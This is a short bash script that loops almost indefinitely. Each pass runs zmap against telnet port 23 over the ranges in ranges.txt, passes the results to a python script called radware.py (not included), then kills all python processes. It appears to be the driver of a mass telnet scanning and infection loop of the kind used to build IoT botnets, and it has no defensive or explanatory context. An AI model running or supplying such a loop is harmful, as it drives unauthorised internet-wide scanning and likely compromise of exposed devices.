#!/bin/bash
COUNTER=900000000
until [  $COUNTER -lt 10 ]; do
rm -rf radware.txt
zmap -p23 -w ranges.txt -o radware.txt
python radware.py radware.txt
pkill -9 python
done
